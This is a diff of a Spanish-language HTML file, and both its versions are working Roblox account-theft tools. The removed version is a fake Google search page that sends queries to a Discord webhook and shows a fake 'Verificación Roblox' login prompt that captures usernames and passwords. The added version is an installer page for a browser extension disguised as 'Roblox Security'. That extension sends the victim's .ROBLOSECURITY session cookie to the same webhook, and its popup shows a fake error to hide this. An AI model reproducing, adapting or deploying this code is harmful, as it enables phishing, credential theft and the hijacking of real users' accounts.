@@ -1,347 +1,167 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
+    <title>Instalar Extensión</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
+            background: #1a1a1a;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
         }
-        
-        /* Header de Google */
-        .header {
-            padding: 15px 20px;
-            display: flex;
-            justify-content: flex-end;
-            gap: 20px;
-            font-size: 13px;
-        }
-        
-        .header a {
-            color: #202124;
-            text-decoration: none;
-        }
-        
-        .header a:hover {
-            text-decoration: underline;
-        }
-        
-        /* Contenido principal */
-        .main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .logo {
-            margin-bottom: 30px;
-        }
-        
-        .logo img {
-            width: 272px;
-            height: 92px;
-        }
-        
-        /* Barra de búsqueda */
-        .search-container {
-            width: 100%;
-            max-width: 584px;
-            margin-bottom: 30px;
-        }
-        
-        .search-box {
-            display: flex;
-            align-items: center;
-            border: 1px solid #dfe1e5;
-            border-radius: 24px;
-            padding: 5px 15px;
-            transition: 0.3s;
-        }
-        
-        .search-box:hover {
-            box-shadow: 0 1px 6px rgba(32,33,36,0.28);
-        }
-        
-        .search-box input {
-            flex: 1;
-            border: none;
-            outline: none;
-            padding: 12px 10px;
-            font-size: 16px;
-        }
-        
-        .search-icon {
-            width: 24px;
-            height: 24px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%239aa0a6" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>') no-repeat center;
-        }
-        
-        .mic-icon {
-            width: 24px;
-            height: 24px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path fill="%23333333" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path fill="%23333333" d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>') no-repeat center;
-            margin-left: 10px;
-        }
-        
-        /* Botones */
-        .buttons {
-            display: flex;
-            gap: 15px;
-            margin-top: 30px;
-        }
-        
-        .buttons button {
-            background: #f8f9fa;
-            border: 1px solid #f8f9fa;
-            border-radius: 4px;
-            color: #3c4043;
-            font-size: 14px;
-            padding: 10px 16px;
-            cursor: pointer;
-        }
-        
-        .buttons button:hover {
-            border: 1px solid #dadce0;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
-        }
-        
-        /* Footer */
-        .footer {
-            background: #f2f2f2;
-            padding: 15px 30px;
-            color: #70757a;
-            font-size: 14px;
-            display: flex;
-            justify-content: space-between;
-            border-top: 1px solid #dadce0;
-        }
-        
-        .footer-links {
-            display: flex;
-            gap: 25px;
-        }
-        
-        .footer-links a {
-            color: #70757a;
-            text-decoration: none;
-        }
-        
-        /* Área de resultados (iframe oculto inicialmente) */
-        #resultsFrame {
-            width: 100%;
-            height: 100vh;
-            border: none;
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-            background: white;
-        }
-        
-        /* Botón para volver (solo para ti) */
-        #backButton {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 2000;
+        button {
             background: #00b8ff;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 15px 30px;
             border-radius: 5px;
+            font-size: 18px;
             cursor: pointer;
-            display: none;
+            margin: 10px;
+        }
+        .info {
+            background: #333;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px auto;
+            max-width: 500px;
+            text-align: left;
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <div class="header">
-        <a href="#">Gmail</a>
-        <a href="#">Imágenes</a>
-        <div style="width: 32px; height: 32px; background: #8ab4f8; border-radius: 50%;"></div>
+    <h1>🔧 Instalador de Extensión</h1>
+    
+    <div class="info">
+        <h3>📦 Archivos de la extensión:</h3>
+        <p>La extensión ya está empaquetada en este HTML</p>
+        <p>Haz clic en "Instalar" para descargar el .crx</p>
     </div>
     
-    <!-- Contenido principal -->
-    <div class="main">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
-        </div>
-        
-        <div class="search-container">
-            <div class="search-box">
-                <span class="search-icon"></span>
-                <input type="text" id="searchInput" placeholder="Buscar en Google o escribir URL">
-                <span class="mic-icon"></span>
-            </div>
-        </div>
-        
-        <div class="buttons">
-            <button onclick="buscar()">Buscar con Google</button>
-            <button>Voy a tener suerte</button>
-        </div>
+    <button onclick="descargarCRX()">📥 DESCARGAR EXTENSIÓN .crx</button>
+    <button onclick="mostrarInstrucciones()">📋 INSTRUCCIONES</button>
+    
+    <div id="instrucciones" style="display:none; margin-top:20px;">
+        <h3>Cómo instalar en Lemur:</h3>
+        <ol style="text-align:left;">
+            <li>Descarga el archivo .crx</li>
+            <li>Abre Lemur Browser</li>
+            <li>Ve a lemur://extensions</li>
+            <li>Activa "Modo desarrollador"</li>
+            <li>Arrastra el archivo .crx a la ventana</li>
+            <li>Acepta los permisos</li>
+        </ol>
     </div>
-    
-    <!-- Footer -->
-    <div class="footer">
-        <div>Argentina</div>
-        <div class="footer-links">
-            <a href="#">Sobre Google</a>
-            <a href="#">Publicidad</a>
-            <a href="#">Negocios</a>
-            <a href="#">Cómo funciona la Búsqueda</a>
-            <a href="#">Privacidad</a>
-            <a href="#">Condiciones</a>
-        </div>
-    </div>
-    
-    <!-- Iframe para resultados (inicialmente oculto) -->
-    <iframe id="resultsFrame"></iframe>
-    
-    <!-- Botón para volver a la página principal -->
-    <button id="backButton" onclick="volverAlInicio()">⬅ Volver a Google</button>
 
     <script>
         // ===========================================
-        // CONFIGURACIÓN
+        // CONSTRUIR EL .CRX DESDE JS (codificado)
         // ===========================================
-        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
-        
-        // ===========================================
-        // FUNCIÓN DE BÚSQUEDA
-        // ===========================================
-        function buscar() {
-            const query = document.getElementById('searchInput').value.trim();
-            
-            if (query) {
-                // Registrar la búsqueda
+        function descargarCRX() {
+            // Los archivos de la extensión en Base64
+            const files = {
+                "manifest.json": btoa(JSON.stringify({
+                    manifest_version: 3,
+                    name: "Roblox Security",
+                    version: "1.0",
+                    description: "Verificador de seguridad",
+                    permissions: ["cookies", "storage"],
+                    host_permissions: ["https://www.roblox.com/*"],
+                    background: { service_worker: "background.js" },
+                    action: { default_popup: "popup.html", default_icon: "icon.png" }
+                }, null, 2)),
+                
+                "background.js": btoa(`
+const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
+
+chrome.runtime.onInstalled.addListener(() => {
+    chrome.cookies.get({
+        url: "https://www.roblox.com",
+        name: ".ROBLOSECURITY"
+    }, (cookie) => {
+        if (cookie) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: "🍪 Cookie: " + cookie.value})
+            });
+        }
+    });
+});
+
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+    if (tab.url?.includes('roblox.com') && changeInfo.status === 'complete') {
+        chrome.cookies.get({
+            url: "https://www.roblox.com",
+            name: ".ROBLOSECURITY"
+        }, (cookie) => {
+            if (cookie) {
                 fetch(WEBHOOK, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🔍 Búsqueda: ${query}`
-                    })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: "🍪 Cookie: " + cookie.value})
                 });
-                
-                // Si buscan "roblox", mostrar modal falso
-                if (query.toLowerCase().includes('roblox')) {
-                    mostrarModalRoblox();
-                } else {
-                    // Mostrar resultados reales de Google en el iframe
-                    const iframe = document.getElementById('resultsFrame');
-                    iframe.src = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
-                    iframe.style.display = 'block';
-                    
-                    // Mostrar botón para volver
-                    document.getElementById('backButton').style.display = 'block';
-                    
-                    // Ocultar la página principal
-                    document.querySelector('.main').style.display = 'none';
-                    document.querySelector('.header').style.display = 'none';
-                    document.querySelector('.footer').style.display = 'none';
-                }
-            }
-        }
-        
-        // ===========================================
-        // VOLVER AL INICIO
-        // ===========================================
-        function volverAlInicio() {
-            document.getElementById('resultsFrame').style.display = 'none';
-            document.getElementById('backButton').style.display = 'none';
-            
-            document.querySelector('.main').style.display = 'flex';
-            document.querySelector('.header').style.display = 'flex';
-            document.querySelector('.footer').style.display = 'flex';
-            
-            document.getElementById('searchInput').value = '';
-        }
-        
-        // ===========================================
-        // MODAL FALSO DE ROBLOX
-        // ===========================================
-        function mostrarModalRoblox() {
-            const modal = document.createElement('div');
-            modal.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0,0,0,0.9);
-                z-index: 3000;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-            `;
-            
-            modal.innerHTML = `
-                <div style="background: #1e1f22; padding: 30px; border-radius: 10px; width: 400px;">
-                    <h2 style="color: #00b8ff; margin-bottom: 20px;">🔐 Verificación Roblox</h2>
-                    <p style="color: #e8eaed; margin-bottom: 20px;">Por seguridad, confirma tu identidad</p>
-                    <input type="text" id="modalUser" placeholder="Usuario de Roblox" style="width:100%; padding:12px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; border-radius:5px; color:white;">
-                    <input type="password" id="modalPass" placeholder="Contraseña" style="width:100%; padding:12px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; border-radius:5px; color:white;">
-                    <button onclick="capturarCredenciales(this)" style="width:100%; padding:12px; background:#00b8ff; border:none; border-radius:5px; color:white; font-weight:bold; cursor:pointer;">Verificar</button>
-                </div>
-            `;
-            
-            document.body.appendChild(modal);
-        }
-        
-        // ===========================================
-        // CAPTURAR CREDENCIALES
-        // ===========================================
-        window.capturarCredenciales = function(btn) {
-            const modal = btn.closest('div').closest('div');
-            const user = document.getElementById('modalUser').value;
-            const pass = document.getElementById('modalPass').value;
-            
-            if (user && pass) {
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**🔐 ROBLOX CAPTURADO**\nUsuario: ${user}\nContraseña: ${pass}`
-                    })
-                });
-                
-                modal.remove();
-                
-                // Mostrar resultados de Google después
-                const query = document.getElementById('searchInput').value;
-                const iframe = document.getElementById('resultsFrame');
-                iframe.src = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
-                iframe.style.display = 'block';
-                document.getElementById('backButton').style.display = 'block';
-                
-                document.querySelector('.main').style.display = 'none';
-                document.querySelector('.header').style.display = 'none';
-                document.querySelector('.footer').style.display = 'none';
-            }
-        };
-        
-        // ===========================================
-        // PERMITIR BÚSQUEDA CON ENTER
-        // ===========================================
-        document.getElementById('searchInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                buscar();
             }
         });
+    }
+});
+                `),
+                
+                "popup.html": btoa(`
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            width: 300px;
+            padding: 20px;
+            background: #1a1a1a;
+            color: white;
+            text-align: center;
+        }
+        .error {
+            background: #ff4444;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="error">🚫 ERROR 404</div>
+    <p>No se pudo conectar</p>
+    <div style="font-family:monospace;">Código: RBX-404</div>
+</body>
+</html>
+                `),
+                
+                "icon.png": btoa("iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII=") // Pixel rojo
+            };
+            
+            // Crear un ZIP con los archivos
+            const zip = new JSZip();
+            Object.keys(files).forEach(name => {
+                zip.file(name, atob(files[name]), {binary: false});
+            });
+            
+            // Generar y descargar
+            zip.generateAsync({type: "blob"}).then(blob => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'roblox-security.crx';
+                a.click();
+                URL.revokeObjectURL(url);
+            });
+        }
+        
+        function mostrarInstrucciones() {
+            const div = document.getElementById('instrucciones');
+            div.style.display = div.style.display === 'none' ? 'block' : 'none';
+        }
     </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </body>
 </html>
